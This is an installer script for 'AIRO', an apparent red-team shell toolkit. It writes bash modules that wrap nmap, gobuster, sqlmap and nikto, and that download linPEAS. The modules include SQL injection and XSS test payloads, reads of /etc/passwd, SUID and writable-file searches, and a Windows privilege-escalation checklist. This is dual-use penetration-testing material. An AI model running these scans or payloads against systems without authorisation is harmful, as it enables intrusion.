  --fast / --unsafe          - SAFE_MODE=0, SCAN_DELAY=0, RATE_LIMIT=10000 (requires --force)
  --safe                     - SAFE_MODE=1 (re-enable prompts)
  --no-delay                 - SCAN_DELAY=0
  --delay=<seconds>          - Set SCAN_DELAY
  --rate-limit=<pps>         - Set RATE_LIMIT (packets per second)
  --force                    - Required with --fast/--unsafe
  --dry-run                  - Show what would run without executing
  --verbose                  - More detail with --dry-run
  --debug                    - Enable bash tracing for commands
  --no-debug                 - Disable bash tracing
  --proxy <url>              - Route HTTP(S) tools through proxy
  --tor                      - Use Tor (socks5h://127.0.0.1:9050)
  --user-agent <ua>          - Set custom User-Agent
  --ua <ua>                  - Alias for --user-agent
  --jitter <seconds>         - Add random delay jitter to scans
  --json-log                 - Enable JSON command logging
  --no-json-log              - Disable JSON command logging

Examples:
  airo netscan --fast 192.168.1.0/24
  airo webscan https://target.com --delay=0.1
  airo sysenum

HELP
        return 0
    fi
    
    case "$cmd" in
        help)
            airo ""  # Show help
            ;;
        --help|-h)
            airo ""
            ;;
        modules)
            echo "Available modules:"
            if command -v xargs >/dev/null 2>&1; then
                ls -1 "$AIRO_MODULES"/*.sh 2>/dev/null | xargs -I {} basename {} .sh | sort || true
            else
                for file in "$AIRO_MODULES"/*.sh; do
                    [[ -f "$file" ]] && basename "$file" .sh
                done | sort || true
            fi
            ;;
        reload)
            load_config
            log "Configuration reloaded"
            ;;
        update)
            warn "Update: Run installer again or check GitHub"
            ;;
        version)
            echo "All In One RedOps (AIRO) v$AIRO_VERSION"
            ;;
        *)
            # Try lazy loading
            airo_lazy_load "$cmd" "$@"
            ;;
    esac
}

# Create aliases for common commands
create_aliases() {
    # Network aliases
    alias netscan='airo netscan'
    alias portscan='airo portscan'
    alias lhost='airo lhost'
    alias myip='airo myip'
    
    # Web aliases
    alias webscan='airo webscan'
    alias dirscan='airo dirscan'
    alias sqlcheck='airo sqlcheck'
    
    # System aliases
    alias sysenum='airo sysenum'
    alias sudofind='airo sudofind'
    
    # And many more...
}

# Setup completion
setup_completion() {
    if [[ -n "$BASH_VERSION" ]]; then
        # Bash completion
        if [[ -f "$AIRO_CONFIG/completions/airo.bash" ]]; then
            # shellcheck source=/dev/null
            source "$AIRO_CONFIG/completions/airo.bash"
        else
            complete -W "$(compgen -c | grep ^airo_ | sed 's/^airo_//' || true)" airo
        fi
    elif [[ -n "$ZSH_VERSION" ]]; then
        # Zsh completion
        if [[ -f "$AIRO_CONFIG/completions/airo.zsh" ]]; then
            # shellcheck source=/dev/null
            source "$AIRO_CONFIG/completions/airo.zsh"
        else
            autoload -Uz compinit
            compinit
        fi
    fi
}

# Initialize framework
init_framework() {
    setup_colors
    load_config
    
    if [[ "$AUTO_LOAD_MODULES" == "1" ]]; then
        load_all_modules
        create_aliases
    fi
    
    setup_completion
    
    log "All In One RedOps (AIRO) v$AIRO_VERSION loaded"
}
'''
# Note: the full network module is defined later in this file; this duplicate stub was removed.
# The core loader is written by create_core_loader() and the real network module is created by
# the following function defined further below in this script.
    
    core_path = base_dir / "airo-core.sh"
    core_path.write_text(core_content, encoding='utf-8')
    core_path.chmod(0o755)

def create_module_network(base_dir):
    """Create network module"""
    network_content = '''#!/usr/bin/env bash
set -euo pipefail
# Network Reconnaissance Module
# 12 network reconnaissance commands

run_with_grc() {
    if command -v grc >/dev/null 2>&1; then
        grc "$@"
    else
        "$@"
    fi
}

nmap_with_grc() {
    if command -v grc >/dev/null 2>&1; then
        grc nmap "$@"
    else
        nmap "$@"
    fi
}

sudo_nmap_with_grc() {
    if command -v grc >/dev/null 2>&1; then
        sudo grc nmap "$@"
    else
        sudo nmap "$@"
    fi
}

net_usage() {
    echo "Usage: $1 [target] [--ports <list>] [--top <n>] [--timeout <s>] [--output <file>]"
}

parse_net_flags() {
    PORTS=""
    TOP_PORTS=""
    HOST_TIMEOUT=""
    OUTFILE=""
    if ! PARSED=$(getopt -o h --long ports:,top:,timeout:,output:,help -- "$@"); then
        net_usage "$0"
        return 1
    fi
    eval set -- "$PARSED"
    while true; do
        case "$1" in
            --ports) PORTS="$2"; shift 2 ;;
            --top) TOP_PORTS="$2"; shift 2 ;;
            --timeout) HOST_TIMEOUT="$2"; shift 2 ;;
            --output) OUTFILE="$2"; shift 2 ;;
            -h|--help) net_usage "$0"; return 1 ;;
            --) shift; break ;;
            *) break ;;
        esac
    done
    REMAINING_ARGS=("$@")
}

airo_netscan(){
    parse_net_flags "$@"
    set -- "${REMAINING_ARGS[@]}"
    local subnet="${1:-}"
    if [[ -z "$subnet" ]]; then
        local ip="$(airo_lhost)"
        subnet="${ip%.*}.0/24"
        echo "[*] Scanning subnet: $subnet"
    fi
    
    if command -v nmap >/dev/null 2>&1; then
        local args=(-sn "$subnet")
        [[ -n "$HOST_TIMEOUT" ]] && args+=(--host-timeout "$HOST_TIMEOUT")
        if [[ -n "$OUTFILE" ]]; then
        nmap_with_grc "${args[@]}" -oN "$OUTFILE" || true
        echo "[+] Results saved to $OUTFILE"
    else
        nmap_with_grc "${args[@]}" || true
    fi
    else
        echo "[-] nmap not installed"
    fi
}

airo_portscan() {
    parse_net_flags "$@"
    set -- "${REMAINING_ARGS[@]}"
    local target="${1:?Usage: portscan <target> [--ports <list>|--top <n>] [--timeout <s>] [--output <file>]}"
    
    echo "[*] Scanning $target..."
    if command -v nmap >/dev/null 2>&1; then
        local args=(-sS -T4 "$target")
        [[ -n "$PORTS" ]] && args+=(-p "$PORTS")
        [[ -n "$TOP_PORTS" ]] && args+=(--top-ports "$TOP_PORTS")
        [[ -n "$HOST_TIMEOUT" ]] && args+=(--host-timeout "$HOST_TIMEOUT")
        if [[ -n "$OUTFILE" ]]; then
            nmap_with_grc "${args[@]}" -oN "$OUTFILE" || true
            echo "[+] Results saved to $OUTFILE"
        else
            nmap_with_grc "${args[@]}" || true
        fi
    else
        echo "[-] nmap not installed"
    fi
}

airo_udpscan() {
    parse_net_flags "$@"
    set -- "${REMAINING_ARGS[@]}"
    local target="${1:?Usage: udpscan <target> [--ports <list>|--top <n>] [--timeout <s>] [--output <file>]}"
    
    echo "[*] UDP scan on $target..."
    if command -v nmap >/dev/null 2>&1; then
        local args=(-sU -T4 "$target")
        [[ -n "$PORTS" ]] && args+=(-p "$PORTS")
        [[ -n "$TOP_PORTS" ]] && args+=(--top-ports "$TOP_PORTS")
        [[ -n "$HOST_TIMEOUT" ]] && args+=(--host-timeout "$HOST_TIMEOUT")
        if [[ -n "$OUTFILE" ]]; then
            sudo_nmap_with_grc "${args[@]}" -oN "$OUTFILE" || true
            echo "[+] Results saved to $OUTFILE"
        else
            sudo_nmap_with_grc "${args[@]}" || true
        fi
    fi
}

airo_alivehosts() {
    parse_net_flags "$@"
    set -- "${REMAINING_ARGS[@]}"
    local subnet="${1:-}"
    if [[ -z "$subnet" ]]; then
        local ip="$(airo_lhost)"
        subnet="${ip%.*}.0/24"
    fi

    echo "[*] Finding live hosts in $subnet..."
    if ! command -v ping >/dev/null 2>&1; then
        echo "[-] ping not installed"
        return 0
    fi
    local i
    for ((i=1; i<=254; i++)); do
        if run_with_grc ping -c 1 -W 1 "${subnet%.*}.$i" | grep -q "64 bytes"; then
            echo "${subnet%.*}.$i"
        fi &
    done
    wait
}

airo_dnscan() {
    local domain="${1:?Usage: dnscan <domain>}"
    
    echo "[*] Scanning $domain for subdomains..."

    if ! command -v host >/dev/null 2>&1; then
        echo "[-] host not installed"
        return 0
    fi
    
    # Simple subdomain brute force
    local words=(www ftp mail admin test dev staging api)
    for word in "${words[@]}"; do
        host "$word.$domain" 2>/dev/null | grep -v "NXDOMAIN" || true
    done
}

airo_safescan() {
    parse_net_flags "$@"
    set -- "${REMAINING_ARGS[@]}"
    local target="${1:?Usage: safescan <target>}"
    local delay="${SCAN_DELAY:-0.5}"
    local rate="${RATE_LIMIT:-100}"
    
    echo "[*] Safe scan: $target (delay: ${delay}s, rate: ${rate}pps)"
    
    if command -v nmap >/dev/null 2>&1; then
        nmap_with_grc -T4 --max-rate "$rate" --scan-delay "${delay}s" "$target" || true
    else
        run_with_grc ping -c 4 -i "$delay" "$target" || true
    fi
}

airo_lhost() {
    local ip
    if command -v ip >/dev/null 2>&1; then
        ip="$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}' || true)"
    fi
    if [[ -z "$ip" ]] && command -v hostname >/dev/null 2>&1; then
        ip="$(hostname -I 2>/dev/null | awk '{print $1}' || true)"
    fi
    echo "$ip"
}

airo_myip() {
    echo "[*] Getting public IP..."
    if command -v curl >/dev/null 2>&1; then
        airo_curl -fsSL ifconfig.me 2>/dev/null || airo_curl -fsSL api.ipify.org 2>/dev/null || true
    else
        echo "[-] curl not installed"
    fi
}

airo_tracer() {
    local target="${1:?Usage: tracer <host>}"
    
    if command -v traceroute >/dev/null 2>&1; then
        run_with_grc traceroute -n "$target" || true
    elif command -v tracepath >/dev/null 2>&1; then
        run_with_grc tracepath "$target" || true
    else
        echo "[-] No traceroute tool found"
    fi
}

airo_whoislookup() {
    local target="${1:?Usage: whoislookup <domain/ip>}"
    
    if command -v whois >/dev/null 2>&1; then
        run_with_grc whois "$target" || true
    else
        echo "[-] whois not installed"
    fi
}

airo_dnsdump() {
    local domain="${1:?Usage: dnsdump <domain>}"
    
    echo "[*] DNS records for: $domain"
    
    if ! command -v dig >/dev/null 2>&1; then
        echo "[-] dig not installed"
        return 0
    fi

    for record in A AAAA MX TXT NS SOA; do
        echo -e "\\n$record:"
        run_with_grc dig "$domain" "$record" +short 2>/dev/null || true
    done
}

airo_cidrcalc() {
    local cidr="${1:?Usage: cidrcalc <ip/cidr>}"
    
    echo "[*] Calculating CIDR: $cidr"
    
    if command -v ipcalc >/dev/null 2>&1; then
        ipcalc "$cidr" || true
    else
        echo "[-] ipcalc not installed"
    fi
}

# Export functions
export -f airo_netscan airo_portscan airo_udpscan airo_alivehosts airo_dnscan
export -f airo_safescan airo_lhost airo_myip airo_tracer airo_whoislookup
export -f airo_dnsdump airo_cidrcalc
'''
    
    (base_dir / "modules" / "network.sh").write_text(network_content, encoding='utf-8')
    (base_dir / "modules" / "network.sh").chmod(0o755)

def create_module_web(base_dir):
    """Create web module"""
    web_content = '''#!/usr/bin/env bash
set -euo pipefail
# Web Assessment Module
# 14 web security testing commands

WORDLIST_BASE="${WORDLIST_BASE:-$HOME/SecLists}"
WORDLIST_DIRSCAN="${WORDLIST_DIRSCAN:-$WORDLIST_BASE/Discovery/Web-Content/common.txt}"
WORDLIST_FUZZURL="${WORDLIST_FUZZURL:-$WORDLIST_BASE/Discovery/Web-Content/raft-medium-words.txt}"
WORDLIST_EXTENSIONS="${WORDLIST_EXTENSIONS:-php,asp,aspx,html,js}"

resolve_dir_wordlist() {
    local choice="$1"
    case "$choice" in
        ""|"default"|"common") echo "$WORDLIST_DIRSCAN" ;;
        raft-small) echo "$WORDLIST_BASE/Discovery/Web-Content/raft-small-directories.txt" ;;
        raft-medium) echo "$WORDLIST_BASE/Discovery/Web-Content/raft-medium-directories.txt" ;;
        raft-large) echo "$WORDLIST_BASE/Discovery/Web-Content/raft-large-directories.txt" ;;
        *) echo "$choice" ;;
    esac
}

resolve_fuzz_wordlist() {
    local choice="$1"
    case "$choice" in
        ""|"default") echo "$WORDLIST_FUZZURL" ;;
        raft-small) echo "$WORDLIST_BASE/Discovery/Web-Content/raft-small-words.txt" ;;
        raft-medium) echo "$WORDLIST_BASE/Discovery/Web-Content/raft-medium-words.txt" ;;
        raft-large) echo "$WORDLIST_BASE/Discovery/Web-Content/raft-large-words.txt" ;;
        *) echo "$choice" ;;
    esac
}

ensure_wordlist() {
    local path="$1"
    if [[ ! -f "$path" ]]; then
        echo "[-] Wordlist not found: $path"
        echo "[!] Clone SecLists: git clone https://github.com/danielmiessler/SecLists.git \"$WORDLIST_BASE\""
        return 1
    fi
    return 0
}

parse_web_flags() {
    DIR_THREADS=""
    DIR_EXTS=""
    FUZZ_THREADS=""
    WORDLIST_OVERRIDE=""
    if ! PARSED=$(getopt -o h --long wordlist:,threads:,extensions:,help -- "$@"); then
        echo "Usage: <cmd> <url> [--wordlist <path|alias>] [--threads <n>] [--extensions ext,ext]"
        return 1
    fi
    eval set -- "$PARSED"
    while true; do
        case "$1" in
            --wordlist) WORDLIST_OVERRIDE="$2"; shift 2 ;;
            --threads) DIR_THREADS="$2"; FUZZ_THREADS="$2"; shift 2 ;;
            --extensions) DIR_EXTS="$2"; shift 2 ;;
            -h|--help)
                echo "Usage: <cmd> <url> [--wordlist <path|alias>] [--threads <n>] [--extensions ext,ext]"
                return 1
                ;;
            --) shift; break ;;
            *) break ;;
        esac
    done
    REMAINING_ARGS=("$@")
}

airo_webscan() {
    local url="${1:?Usage: webscan <url>}"
    
    echo "[*] Scanning $url..."
    
    if command -v nikto >/dev/null 2>&1; then
        nikto -h "$url" || true
    else
        echo "[-] nikto not installed"
    fi
}

airo_dirscan() {
    parse_web_flags "$@"
    set -- "${REMAINING_ARGS[@]}"
    local url="${1:?Usage: dirscan <url> [--wordlist <path|alias>] [--threads <n>] [--extensions ext,ext] }"
    local wordlist_input="${2:-$WORDLIST_OVERRIDE}"
    local wordlist
    wordlist="$(resolve_dir_wordlist "$wordlist_input")"
    ensure_wordlist "$wordlist" || return 1
    
    echo "[*] Directory scan: $url (wordlist: $wordlist)"
    
    if command -v gobuster >/dev/null 2>&1; then
        local args=(dir -u "$url" -w "$wordlist")
        [[ -n "$DIR_THREADS" ]] && args+=(-t "$DIR_THREADS")
        [[ -n "$DIR_EXTS" ]] && args+=(-x "$DIR_EXTS")
        gobuster "${args[@]}" || true
    elif command -v dirb >/dev/null 2>&1; then
        dirb "$url" "$wordlist" || true
    else
        echo "[-] No directory scanner found"
    fi
}

airo_fuzzurl() {
    parse_web_flags "$@"
    set -- "${REMAINING_ARGS[@]}"
    local url="${1:?Usage: fuzzurl <url> [--wordlist <path|alias>] [--threads <n>] }"
    local wordlist_input="${2:-$WORDLIST_OVERRIDE}"
    local wordlist
    wordlist="$(resolve_fuzz_wordlist "$wordlist_input")"
    ensure_wordlist "$wordlist" || return 1
    
    echo "[*] URL fuzzing: $url (wordlist: $wordlist)"
    
    if command -v ffuf >/dev/null 2>&1; then
        local args=(-u "$url/FUZZ" -w "$wordlist")
        [[ -n "$FUZZ_THREADS" ]] && args+=(-t "$FUZZ_THREADS")
        ffuf "${args[@]}" || true
    else
        echo "[-] ffuf not installed"
    fi
}

airo_httpxprobe() {
    local target="${1:?Usage: httpxprobe <url|domain|file> [output?] }"
    local output="${2:-}"
    local args=(-silent -status-code -title -tech-detect)
    if [[ -f "$target" ]]; then
        args+=(-l "$target")
    else
        args+=(-u "$target")
    fi
    [[ -n "$output" ]] && args+=(-o "$output")
    
    if command -v httpx >/dev/null 2>&1; then
        httpx "${args[@]}" || true
    else
        echo "[-] httpx not installed (projectdiscovery)."
    fi
}

airo_wayback() {
    local domain="${1:?Usage: wayback <domain> [output?] }"
    local output="${2:-}"
    if command -v gau >/dev/null 2>&1; then
        if [[ -n "$output" ]]; then
            gau "$domain" -o "$output" || true
        else
            gau "$domain" || true
        fi
    elif command -v waybackurls >/dev/null 2>&1; then
        if [[ -n "$output" ]]; then
            waybackurls "$domain" > "$output" || true
        else
            waybackurls "$domain" || true
        fi
    else
        echo "[-] gau or waybackurls not installed"
    fi
}

airo_katana() {
    local target="${1:?Usage: katana <url> [output?] }"
    local output="${2:-}"
    if command -v katana >/dev/null 2>&1; then
        if [[ -n "$output" ]]; then
            katana -u "$target" -o "$output" || true
        else
            katana -u "$target" || true
        fi
    else
        echo "[-] katana not installed (projectdiscovery)."
    fi
}

airo_nuclei() {
    local templates=""
    local severity=""
    local rate=""
    local output=""
    while (($#)); do
        case "$1" in
            --templates=*) templates="${1#*=}" ;;
            --templates) templates="$2"; shift ;;
            --severity=*) severity="${1#*=}" ;;
            --severity) severity="$2"; shift ;;
            --rate=*) rate="${1#*=}" ;;
            --rate) rate="$2"; shift ;;
            --output=*) output="${1#*=}" ;;
            --output) output="$2"; shift ;;
            --) shift; break ;;
            *) break ;;
        esac
        shift || break
    done
    local target="${1:-}"
    if [[ -z "$target" ]]; then
        echo "Usage: nuclei <url> [--templates <dir>] [--severity <sev>] [--rate <n>] [--output <file>]"
        return 1
    fi
    
    if command -v nuclei >/dev/null 2>&1; then
        local args=(-u "$target")
        [[ -n "$templates" ]] && args+=(-t "$templates")
        [[ -n "$severity" ]] && args+=(-severity "$severity")
        [[ -n "$rate" ]] && args+=(-rate "$rate")
        [[ -n "$output" ]] && args+=(-o "$output")
        nuclei "${args[@]}" || true
    else
        echo "[-] nuclei not installed (projectdiscovery)."
    fi
}

airo_sqlcheck() {
    local url="${1:?Usage: sqlcheck <url>}"
    
    if [[ "$SAFE_MODE" -eq 1 ]]; then
        read -p "[!] SQL injection test on $url? [y/N]: " -r
        [[ ! $REPLY =~ ^[Yy]$ ]] && return
    fi
    
    echo "[*] Testing $url for SQL injection..."
    
    if command -v sqlmap >/dev/null 2>&1; then
        sqlmap -u "$url" --batch || true
    else
        echo "[-] sqlmap not installed"
        echo "[*] Manual test: $url' OR '1'='1"
    fi
}

airo_xsscheck() {
    local url="${1:?Usage: xsscheck <url>}"
    
    echo "[*] XSS testing: $url"
    echo "[*] Test payloads:"
    cat << 'XSS_PAYLOADS'
  <script>alert('XSS')</script>
  "><script>alert('XSS')</script>
  '><script>alert('XSS')</script>
XSS_PAYLOADS
}

airo_takeover() {
    local domain="${1:?Usage: takeover <domain>}"
    
    echo "[*] Subdomain takeover check: $domain"
    echo "[*] Checking for vulnerable services..."

    if ! command -v host >/dev/null 2>&1; then
        echo "[-] host not installed"
        return 0
    fi
    
    # Simple check
    local subdomains=("www" "api" "dev" "staging" "test")
    for sub in "${subdomains[@]}"; do
        if host "$sub.$domain" 2>/dev/null | grep -qi "not found\\|nxdomain"; then
            echo "[+] Possible takeover: $sub.$domain"
        fi
    done
}

airo_wpscan() {
    local url="${1:?Usage: wpscan <url>}"
    
    echo "[*] WordPress scan: $url"
    
    if command -v wpscan >/dev/null 2>&1; then
        wpscan --url "$url" --enumerate vp,vt,u || true
    else
        echo "[-] wpscan not installed"
    fi
}

airo_joomscan() {
    local url="${1:?Usage: joomscan <url>}"
    
    if command -v joomscan >/dev/null 2>&1; then
        joomscan -u "$url" || true
    else
        echo "[-] joomscan not installed"
    fi
}

airo_sslscan() {
    local target="${1:?Usage: sslscan <host:port>}"
    
    echo "[*] SSL scan: $target"
    
    if command -v sslscan >/dev/null 2>&1; then
        sslscan "$target" || true
    elif command -v testssl.sh >/dev/null 2>&1; then
        testssl.sh "$target" || true
    else
        echo "[-] No SSL scanner found"
    fi
}

airo_headerscan() {
    local url="${1:?Usage: headerscan <url>}"
    
    echo "[*] HTTP headers: $url"
    if command -v curl >/dev/null 2>&1; then
        airo_curl -s -I "$url" | grep -v '^$' || true
    else
        echo "[-] curl not installed"
    fi
}

export -f airo_webscan airo_dirscan airo_fuzzurl airo_sqlcheck airo_xsscheck
export -f airo_takeover airo_wpscan airo_joomscan airo_sslscan airo_headerscan
export -f airo_httpxprobe airo_wayback airo_katana airo_nuclei
'''
    
    (base_dir / "modules" / "web.sh").write_text(web_content, encoding='utf-8')
    (base_dir / "modules" / "web.sh").chmod(0o755)

def create_module_system(base_dir):
    """Create system module"""
    system_content = '''#!/usr/bin/env bash
set -euo pipefail
# System Enumeration Module
# 8 system enumeration commands

sys_usage() {
    echo "Usage: $1 [--help]"
}

airo_sysenum() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        sys_usage "airo_sysenum"
        return 0
    fi
    echo "[*] System enumeration started..."
    
    echo -e "\\n=== SYSTEM INFORMATION ==="
    uname -a || true
    
    echo -e "\\n=== USER INFO ==="
    id || true
    whoami || true
    
    echo -e "\\n=== NETWORK ==="
    if command -v ip >/dev/null 2>&1; then
        ip a 2>/dev/null || true
    elif command -v ifconfig >/dev/null 2>&1; then
        ifconfig 2>/dev/null || true
    else
        echo "[-] ip/ifconfig not available"
    fi
    
    echo -e "\\n=== PROCESSES ==="
    if command -v ps >/dev/null 2>&1; then
        ps aux --sort=-%mem | head -20 || true
    else
        echo "[-] ps not available"
    fi
    
    echo -e "\\n=== SERVICES ==="
    if command -v systemctl >/dev/null 2>&1; then
        systemctl list-units --type=service --state=running 2>/dev/null || true
    elif command -v service >/dev/null 2>&1; then
        service --status-all 2>/dev/null || true
    else
        echo "[-] No service manager detected"
    fi
    
    echo -e "\\n=== CRON JOBS ==="
    crontab -l 2>/dev/null || true
    ls -la /etc/cron* 2>/dev/null || true
}

airo_sudofind() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_sudofind"
        return 0
    fi
    echo "[*] Finding SUID/SGID files..."
    find / -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null | head -30 || true
}

airo_capfind() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_capfind"
        return 0
    fi
    echo "[*] Finding capability-enabled binaries..."
    
    if command -v getcap >/dev/null 2>&1; then
        getcap -r / 2>/dev/null | head -30 || true
    else
        echo "[-] getcap not available"
    fi
}

airo_cronfind() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_cronfind"
        return 0
    fi
    echo "[*] Listing cron jobs..."
    
    echo -e "\\nUser cron:"
    crontab -l 2>/dev/null || echo "No user cron"
    
    echo -e "\\nSystem cron:"
    ls -la /etc/cron* 2>/dev/null || true
    
    echo -e "\\nSystemd timers:"
    if command -v systemctl >/dev/null 2>&1; then
        systemctl list-timers 2>/dev/null | head -20 || true
    else
        echo "No systemd timers"
    fi
}

airo_procmon() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_procmon"
        return 0
    fi
    echo "[*] Process monitoring (Ctrl+C to stop)..."
    
    if command -v watch >/dev/null 2>&1; then
        watch -n 1 'ps aux --sort=-%cpu | head -20' || true
    else
        if ! command -v ps >/dev/null 2>&1; then
            echo "[-] ps not available"
            return 1
        fi
        while true; do
            clear || true
            ps aux --sort=-%cpu | head -20 || true
            sleep 2
        done
    fi
}

airo_libfind() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_libfind"
        return 0
    fi
    echo "[*] Checking for vulnerable libraries..."
    
    # Check common vulnerable libraries
    local libs=("libssl" "openssl" "glibc" "bash")
    
    for lib in "${libs[@]}"; do
        dpkg -l | grep -i "$lib" 2>/dev/null || \
        rpm -qa | grep -i "$lib" 2>/dev/null || \
        pacman -Q | grep -i "$lib" 2>/dev/null || true
    done
}

airo_serviceenum() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_serviceenum"
        return 0
    fi
    echo "[*] Enumerating services..."
    
    # Systemd
    if command -v systemctl >/dev/null 2>&1; then
        echo -e "\\nSystemd Services:"
        systemctl list-units --type=service --state=running 2>/dev/null || true
    fi
    
    # init.d
    if [[ -d /etc/init.d ]]; then
        echo -e "\\nInit.d Services:"
        ls -la /etc/init.d/ || true
    fi
    
    # Listening ports
    echo -e "\\nListening Ports:"
    if command -v ss >/dev/null 2>&1; then
        ss -tulpn 2>/dev/null || true
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tulpn 2>/dev/null || true
    else
        echo "[-] ss/netstat not available"
    fi
}

airo_userenum() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_userenum"
        return 0
    fi
    echo "[*] Enumerating users and groups..."
    
    echo -e "\\nUsers:"
    cut -d: -f1,3,4,6,7 /etc/passwd | head -20 || true
    
    echo -e "\\nGroups:"
    cut -d: -f1,3,4 /etc/group | head -20 || true
    
    echo -e "\\nLogged in users:"
    who -a || true
}

export -f airo_sysenum airo_sudofind airo_capfind airo_cronfind airo_procmon
export -f airo_libfind airo_serviceenum airo_userenum
'''
    
    (base_dir / "modules" / "system.sh").write_text(system_content, encoding='utf-8')
    (base_dir / "modules" / "system.sh").chmod(0o755)

def create_module_privesc(base_dir):
    """Create privilege escalation module"""
    privesc_content = '''#!/usr/bin/env bash
set -euo pipefail
# Privilege Escalation Module
# 6 privilege escalation commands

privesc_usage() {
    echo "Usage: $1 [--help]"
}

PEAS_DIR="${PEAS_DIR:-$AIRO_HOME/tools/peas}"
LINPEAS_URL="${LINPEAS_URL:-https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh}"
WINPEAS_URL="${WINPEAS_URL:-https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe}"
LINPEAS_SHA256="${LINPEAS_SHA256:-}"
WINPEAS_SHA256="${WINPEAS_SHA256:-}"

ensure_peas_dir() {
    mkdir -p "$PEAS_DIR"
}

load_peas_hashes() {
    if [[ -n "$LINPEAS_SHA256" && -n "$WINPEAS_SHA256" ]]; then
        return 0
    fi
    local vendors_path="${AIRO_HOME:-$HOME/.airo}/vendors/tools.json"
    if [[ ! -f "$vendors_path" ]]; then
        return 0
    fi
    if command -v python3 >/dev/null 2>&1; then
        eval "$(python3 - <<'PY'
import json, os
base = os.environ.get("AIRO_HOME", os.path.expanduser("~/.airo"))
vendors = os.path.join(base, "vendors", "tools.json")
try:
    with open(vendors, "r", encoding="utf-8") as f:
        data = json.load(f)
    peas = data.get("peas", {})
    lin = peas.get("linpeas", {}).get("sha256", "")
    win = peas.get("winpeas", {}).get("sha256", "")
    if lin:
        print(f'export LINPEAS_SHA256="{lin}"')
    if win:
        print(f'export WINPEAS_SHA256="{win}"')
except Exception:
    pass
PY
        )"
    fi
}

download_peas() {
    load_peas_hashes
    ensure_peas_dir
    echo "[*] Downloading linPEAS to $PEAS_DIR/linpeas.sh"
    if [[ -n "$LINPEAS_SHA256" ]]; then
        if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PY' || echo "[-] Failed to download linPEAS (hash verification failed)"
import hashlib, urllib.request, sys, os
url = os.environ["LINPEAS_URL"]; dest = os.environ["PEAS_DIR"] + "/linpeas.sh"; expected = os.environ["LINPEAS_SHA256"]
with urllib.request.urlopen(url) as r, open(dest, "wb") as f:
    data = r.read(); f.write(data)
sha = hashlib.sha256(data).hexdigest()
if sha.lower() != expected.lower():
    os.remove(dest)
    sys.exit(f"SHA256 mismatch for linPEAS: got {sha}, expected {expected}")
PY
        else
            echo "[-] python3 not available for hash verification; skipping download"
        fi
    else
        if command -v curl >/dev/null 2>&1; then
            airo_curl -fsSL "$LINPEAS_URL" -o "$PEAS_DIR/linpeas.sh" || echo "[-] Failed to download linPEAS"
        elif command -v wget >/dev/null 2>&1; then
            wget -q "$LINPEAS_URL" -O "$PEAS_DIR/linpeas.sh" || echo "[-] Failed to download linPEAS"
        else
            echo "[-] Neither curl nor wget found; cannot download linPEAS"
        fi
    fi
    chmod +x "$PEAS_DIR/linpeas.sh" 2>/dev/null || true

    echo "[*] Downloading winPEAS (x64) to $PEAS_DIR/winPEASx64.exe"
    if [[ -n "$WINPEAS_SHA256" ]]; then
        if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PY' || echo "[-] Failed to download winPEAS (hash verification failed)"
import hashlib, urllib.request, sys, os
url = os.environ["WINPEAS_URL"]; dest = os.environ["PEAS_DIR"] + "/winPEASx64.exe"; expected = os.environ["WINPEAS_SHA256"]
with urllib.request.urlopen(url) as r, open(dest, "wb") as f:
    data = r.read(); f.write(data)
sha = hashlib.sha256(data).hexdigest()
if sha.lower() != expected.lower():
    os.remove(dest)
    sys.exit(f"SHA256 mismatch for winPEAS: got {sha}, expected {expected}")
PY
        else
            echo "[-] python3 not available for hash verification; skipping download"
        fi
    else
        if command -v curl >/dev/null 2>&1; then
            airo_curl -fsSL "$WINPEAS_URL" -o "$PEAS_DIR/winPEASx64.exe" || echo "[-] Failed to download winPEAS"
        elif command -v wget >/dev/null 2>&1; then
            wget -q "$WINPEAS_URL" -O "$PEAS_DIR/winPEASx64.exe" || echo "[-] Failed to download winPEAS"
        else
            echo "[-] Neither curl nor wget found; cannot download winPEAS"
        fi
    fi
}

airo_getpeas() {
    download_peas
    echo "[*] linPEAS: $PEAS_DIR/linpeas.sh"
    echo "[*] winPEAS (x64): $PEAS_DIR/winPEASx64.exe"
}

airo_lpe() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        privesc_usage "airo_lpe"
        return 0
    fi
    echo "[*] Linux Privilege Escalation Checks"
    
    echo -e "\\n1. Kernel & OS Info:"
    uname -a || true
    cat /etc/*release 2>/dev/null || true
    
    echo -e "\\n2. Sudo Permissions:"
    sudo -l 2>/dev/null || echo "No sudo access"
    
    echo -e "\\n3. SUID/SGID Files:"
    find / -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null | head -20 || true
    
    echo -e "\\n4. Writable Files:"
    find / -writable 2>/dev/null | head -20 || true
    
    echo -e "\\n5. Cron Jobs:"
    crontab -l 2>/dev/null || true
    ls -la /etc/cron* 2>/dev/null || true
    
    echo -e "\\n[*] Consider running linpeas for detailed check (download with: airo getpeas)"
}

airo_wpe() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        privesc_usage "airo_wpe"
        return 0
    fi
    echo "[*] Windows Privilege Escalation Checklist"
    
    cat << 'WIN_PRIVESC'
1. System Information:
   systeminfo
   whoami /priv
   net user
   net localgroup administrators

2. Installed Software:
   dir "C:\\Program Files"
   dir "C:\\Program Files (x86)"
   reg query HKLM\\Software

3. Scheduled Tasks:
   schtasks /query /fo LIST /v
   dir C:\\Windows\\Tasks

4. Services:
   sc query
   net start
   wmic service get name,displayname,pathname,startmode

Tools:
